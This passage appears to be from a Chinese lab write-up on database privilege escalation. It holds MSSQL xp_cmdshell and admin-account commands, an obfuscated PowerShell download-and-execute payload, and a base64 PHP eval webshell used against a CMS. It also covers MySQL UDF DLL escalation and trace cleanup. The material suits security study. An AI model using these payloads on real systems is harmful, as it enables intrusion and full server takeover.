</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master..xp_cmdshell &quot;ver&quot;;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215152920401.png" alt="image-20240215152920401"></p><p>如果像这样的话，就是没有开启</p></li><li><p>启用 xp_cmdshell</p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;<br>exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;<br><br></code></pre></td></tr></table></figure><p>   设置完成之后</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153044752.png" alt="image-20240215153044752"></p><p>   就可以通过使用</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master..xp_cmdshell &quot;ver&quot;;<br></code></pre></td></tr></table></figure>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master..xp_cmdshell &quot;net user&quot;;<br></code></pre></td></tr></table></figure><ol start="5"><li>执行系统命令添加用户</li></ol>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加用户</span><br><span class="hljs-built_in">exec</span> master..xp_cmdshell <span class="hljs-string">&quot;net user name password /add&quot;</span><br><br><span class="hljs-comment"># 添加用户到管理组</span><br><span class="hljs-built_in">exec</span> master..xp_cmdshell <span class="hljs-string">&quot;net localgroup administrators name /add&quot;</span><br></code></pre></td></tr></table></figure><ol start="6"><li><p>或者直接执行payload </p><p>web_delivery</p><p>只用这个模块</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153647318.png" alt="image-20240215153647318"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-e</span> WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABuAEMAbABlAGwAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbgBDAGwAZQBsAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbgBDAGwAZQBsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADAAMAAxADoAOAAwADgAMAAvADIAbgBUAHMAcwBKAHMAMQAvADgAYQB3AEgAcQBoAHMAYwB2AGQAYwAzADUAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAwADAAMQA6ADgAMAA4ADAALwAyAG4AVABzAHMASgBzADEAJwApACkAOwA=<br><br></code></pre></td></tr></table></figure><p>让其运行这个payload 然后就能获取对应的</p><p>或者使用hta_server</p></li></ol><p></p><h2 id="xp-regread"><a href="#xp-regread" class="headerlink" title="xp_regread"></a>xp_regread</h2><p>这个模块有一个问题，这个没有回显</p><ol><li><p>是否开启远程桌面</p><blockquote><p>1:开启</p><p>0:关闭</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master..xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="hljs-string">Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>读取远程桌面端口  </p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">EXEC</span></span> master..xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&#x27;</span>,<span class="hljs-string">&#x27;PortNumber&#x27;</span> <br></code></pre></td></tr></table></figure></li><li><p>开启远程桌面</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> master.dbo.xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>关闭远程桌面</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">EXEC master.dbo.xp_regwrit<span class="hljs-string">e&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure></li></ol><h2 id="沙盒模式"><a href="#沙盒模式" class="headerlink" title="沙盒模式"></a>沙盒模式</h2><blockquote><p>只有windows xp和windows 2003可用</p></blockquote><blockquote><p>沙盒模式是数据库的一种安全功能，在沙盒模式下，只对控件和字段属性中的安全且不含恶意代  码的表达式求值。如果表达不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全  的。  </p></blockquote><blockquote><p>无法执行命令时，xp_regwrite 可用</p></blockquote><ul><li><p>启用Ad Hoc Distributed Queries  </p><blockquote><p>exec sp_configure  ‘show advanced options’,1;reconfigure;  </p><p>exec sp_configure  ‘Ad Hoc Distributed Queries’,1;reconfigure  </p></blockquote></li><li><p>读取SandBoxMode[可选]  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master.dbo.xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>SandBoxMode参数含义（默认是2）  </p><p>0：在任何使用者中禁止启用安全模式  </p><p>1：仅在允许范围内  </p><p>2：必须在<strong>access</strong>模式下  </p><p>3：完全开启  </p></blockquote></li><li><p>关闭沙盒模式</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">exec</span></span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>执行系统命令</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 添加用户 test/test</span><br><span class="hljs-keyword">select</span> * <span class="hljs-function"><span class="hljs-keyword">from</span> <span class="hljs-title">openrowset</span>(<span class="hljs-params"><span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c net user test test /add&quot;)&#x27;</span></span>)</span>;<br><br><span class="hljs-keyword">select</span> * <span class="hljs-function"><span class="hljs-keyword">from</span> <span class="hljs-title">openrowset</span>(<span class="hljs-params"><span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c net localgroup administrators test /add&quot;)&#x27;</span></span>)</span>;<br><br><span class="hljs-meta"># 执行whoami命令</span><br><span class="hljs-keyword">select</span> * <span class="hljs-function"><span class="hljs-keyword">from</span> <span class="hljs-title">openrowset</span>(<span class="hljs-params"><span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c whoami&quot;)&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure></li></ul><h1 id="提权示例"><a href="#提权示例" class="headerlink" title="提权示例"></a>提权示例</h1><h2 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><blockquote><p>目标机器<br>操作系统：Windows7<br>IP：10.1.1.132</p><p>攻击机器<br>操作系统：Windows7</p><p>工具：中国蚁剑、winhex<br>IP：10.1.1.200</p></blockquote><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>0x00 简介</p><p>已知目标的网站</p><p><a href="http://www.heti.com/">http://www.heti.com</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161200237.png" alt="image-20240215161200237"></p><p>发现易优cms，尝试收集漏洞</p><p>直接搜索</p><p>然后发现可能存在漏洞，前台getshell </p><p>尝试利用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.heti.com<span class="hljs-regexp">/index.php/</span>api<span class="hljs-regexp">/Uploadify/</span>preview<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161356356.png" alt="image-20240215161356356"></p><p>发现存在漏洞</p><p>0x01</p><p>开启bp 抓包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161801232.png" alt="image-20240215161801232"></p><p>改为post </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161831849.png" alt="image-20240215161831849"></p><p>构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">data:image/php;<span class="hljs-built_in">base64</span>, PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=<br></code></pre></td></tr></table></figure><p>注意这个是php 的一句话木马</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161938401.png" alt="image-20240215161938401"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162022370.png" alt="image-20240215162022370"></p><p>发送之后获取上传的文件路径</p><blockquote><p><a href="http://www.heti.com/preview/a2a0b7436e8f2bb1d951a830ec83340f.php">http://www.heti.com/preview/a2a0b7436e8f2bb1d951a830ec83340f.php</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162259053.png" alt="image-20240215162259053"></p><p>上传成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162344359.png" alt="image-20240215162344359"></p><p>无法执行命令</p><p>0x02  提权</p><p>由于发现没有办法进行执行命令，所以尝试提权</p><p>搜索文件结构发现存在phpstudy</p><p>找到了mysql 的配置文件，尝试寻找user 和password</p><p>通过解密获取了密码是root123</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172129452.png" alt="image-20240215172129452"></p><p>注意这个是mysqli</p><p>0x03 mysql 提权</p><p>查看路径是否可以写</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165407281.png" alt="image-20240215165407281"></p><p>发现可以</p><p>查看mysql 安装目录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165531521.png" alt="image-20240215165531521"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165638535.png" alt="image-20240215165638535"></p><blockquote><p>当 <code>MySQL&lt;5.1</code> 版本时，将<code>.dll</code>文件导入到<code>C:\windows</code>或者<code>C:\windows\system32</code>目录下。</p><p>当 <code>MySQL&gt;5.1</code> 版本时，将<code>.dll</code>文件导入到<code>MySQL5.xx\lib\plugin</code> 目录下 （lib\plugin目录默认不存在，需自行创建）。</p></blockquote><ul><li><p>创建文件夹</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;xxx&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy_pro\\Extensions\\MySQL5.5.29\\lib\::$INDEX_ALLOCATION&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170141213.png" alt="image-20240215170141213"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170146132.png" alt="image-20240215170146132"></p><p>虽然说是False  但是其实已经创建成功</p><p>同样的方式传创建 plugin</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">select &#x27;xxx&#x27; into outfile &#x27;C:<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.5.29<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin\::$INDEX_ALLOCATION&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>导入dll </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> <span class="hljs-number">0</span>x4d5a90000300000004000000ffff0000b80000000000000040000000000 into dumpfile &#x27;C:/phpstudy_pro/Extensions/MySQL5.<span class="hljs-number">5</span>.<span class="hljs-number">29</span>/lib/plugin/udf.dll&#x27;<br></code></pre></td></tr></table></figure><p>注意替换这个值</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172521282.png" alt="image-20240215172521282"></p><p>执行成功</p></li><li><p>创建自定义函数</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173040705.png" alt="image-20240215173040705"></p></li><li><p>执行系统命令</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">sys_eval</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173137205.png" alt="image-20240215173137205"></p></li></ul><p>还有方法二，就是和上面学习过程的一样了，创建一个大型二进制对象</p><p>0x04 方法二</p><p>先做一下痕迹清楚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"># 删除函数<br>drop <span class="hljs-keyword">function</span> <span class="hljs-title">sys_eval</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175247691.png" alt="image-20240215175247691"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 删除函数<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;sys_eval&#x27;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175411134.png" alt="image-20240215175411134"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 查看用户自定义函数</span><br><span class="hljs-keyword">select</span> * from mysql.<span class="hljs-keyword">func</span><br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175452631.png" alt="image-20240215175452631"></p><p>已经不存在了</p><p>接着就是第二个方法了</p><ul><li><p>创建一个大型二进制对象文件，用于存储dll</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-type">BLOB</span>全称为<span class="hljs-type">Binary</span> <span class="hljs-keyword">Large</span> Objects，即大型二进制对象<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> udf(udf <span class="hljs-type">BLOB</span>);<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175624395.png" alt="image-20240215175624395"></p></li><li><p>将udf.dll 二进制数据插入临时表udf 中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">into</span> udf <span class="hljs-keyword">values</span>(<span class="hljs-keyword">CONVERT</span>(二进制文件,<span class="hljs-type">CHAR</span>));<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175827623.png" alt="image-20240215175827623"></p></li><li><p>将<code>udf.dll</code>导出到<code>MySQL</code>安装目录下的<code>lib/plugin/udf1.dll</code>文件中：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> udf <span class="hljs-keyword">FROM</span> udf <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&quot;C:/phpstudy_pro/Extensions/MySQL5.5.29/lib/plugin/udf1.dll&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175915802.png" alt="image-20240215175915802"></p><p>发现是true</p></li><li><p>创建sys_eval 函数</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;udf1.dll&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180019008.png" alt="image-20240215180019008"></p></li><li><p>执行命令</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180112016.png" alt="image-20240215180112016"></p><p>执行成功</p></li></ul><h2 id="MSSql"><a href="#MSSql" class="headerlink" title="MSSql"></a>MSSql</h2><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>测试环境：windows sever 2003，IP地址： 10.1.1.215</p><h2 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h2><p>0x00 </p><p>发现测试目标是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.1.1.215:8080</span>/Information.aspx?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181329634.png" alt="image-20240215181329634"></p><p>正常查询发现可以访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181351775.png" alt="image-20240215181351775"></p><p>添加单引号发现不能执行</p><p>添加1&#x3D;2 发现不能执行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181533737.png" alt="image-20240215181533737"></p><p>0x01  查看用户权限</p><p>判断是否是sysadmin 组的用户，因为只有该组的用户才能执行xp_cmdshell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> IS_SRVROLEMEMBER (<span class="hljs-symbol">&#x27;sysadmin</span>&#x27;))=<span class="hljs-number">1</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182353487.png" alt="image-20240215182353487"></p><p>发现成功出现信息说明&#x3D;1 成立</p><p>0x02 判断是否存在xp_cndshell</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype = <span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182621619.png" alt="image-20240215182621619"></p><p>发现存在xp_cmdshell</p><p>0x03  判断xp_cmdshell 是否可用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;net user name password /add&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182818735.png" alt="image-20240215182818735"></p><p>发现没有开启服务</p><p>根据提示开启</p><p>0x04 开启xp_cmdshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span 